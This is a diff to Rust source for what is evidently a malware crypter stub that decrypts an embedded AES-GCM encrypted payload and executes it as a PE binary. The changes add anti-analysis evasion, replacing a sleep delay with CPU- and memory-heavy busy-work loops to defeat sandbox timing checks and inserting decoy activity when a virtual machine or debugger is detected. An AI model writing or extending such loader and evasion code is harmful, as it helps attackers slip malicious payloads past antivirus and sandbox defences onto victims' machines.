@@ -8,6 +8,7 @@ use aes_gcm::{
     Aes256Gcm, Key, Nonce,
 };
 use std::convert::TryInto;
+use busywork::{BusyWork, Categories, Intensity};
 
 // Embedded at compile time by the crypter.
 static ENCRYPTED: &[u8] = include_bytes!("../payload.enc");
@@ -59,7 +60,7 @@ fn decrypt(ciphertext: &[u8]) -> Result<Vec<u8>, String> {
     let cipher = Aes256Gcm::new(key);
     let nonce: &Nonce<_> = (&NONCE).try_into().map_err(|_| "invalid nonce length")?;
     let plaintext = cipher.decrypt(nonce, ciphertext).map_err(|e| format!("AES-GCM decrypt failed: {:?}", e))?;
-    
+
     if VERBOSE {
         logger::log_info("Binary decrypted successfully.");
     }
@@ -78,13 +79,22 @@ fn execute(pe_bytes: &[u8]) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
+fn behavior_misleading() {
+    BusyWork::new(Intensity::High).allow(Categories::COMPUTE | Categories::MEMORY).run();
+}
+
 fn delay_execution() {
     if DELAY_SECS > 0 {
         if VERBOSE {
             logger::log_info(&format!("Delaying execution by {} seconds...", DELAY_SECS));
         }
 
-        std::thread::sleep(std::time::Duration::from_secs(DELAY_SECS));
+        let target = Duration::from_secs(DELAY_SECS);
+        let start = Instant::now();
+
+        while start.elapsed() < target {
+            behavior_misleading();
+        }
     }
 }
 
@@ -97,6 +107,7 @@ fn run() -> Result<(), Box<dyn Error>> {
         if VERBOSE {
             logger::log_info("VM detected. Exiting...");
         }
+        behavior_misleading();
         return Ok(());
     }
 
@@ -104,6 +115,7 @@ fn run() -> Result<(), Box<dyn Error>> {
         if VERBOSE {
             logger::log_info("Debugger detected. Exiting...");
         }
+        behavior_misleading();
         return Ok(());
     }
 
